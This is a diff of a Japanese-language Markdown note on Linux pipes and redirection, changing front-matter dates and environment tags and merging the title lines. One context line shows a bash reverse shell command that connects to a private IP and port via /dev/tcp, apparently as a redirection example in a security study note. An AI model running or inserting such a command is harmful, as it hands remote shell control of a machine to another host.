@@ -9,17 +9,15 @@ tags:
   - awk
   - tee
   - xargs
-created:
-modified:
-environment: []
+created: 2025-06-29 15:02
+modified: 2026-01-18 20:42
+environment:
+  - OS/Linux
 vulnearability: []
 knowledge_category: OS
 ---
 
-# OS  - Linux - pipes_redirections
-
-
-# パイプとリダイレクション - シェルの入出力を制御する
+# OS  - Linux - pipes_redirections - # パイプとリダイレクション - シェルの入出力を制御する
 
 ## 概要
 
@@ -145,5 +143,4 @@ bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
 ## 注意点・補足
 
 * **`tee` コマンド**: 「出力をファイルに保存しつつ、後続のパイプにも渡したい（画面でも確認したい）」という場合には `tee` コマンドが便利です。
-
 
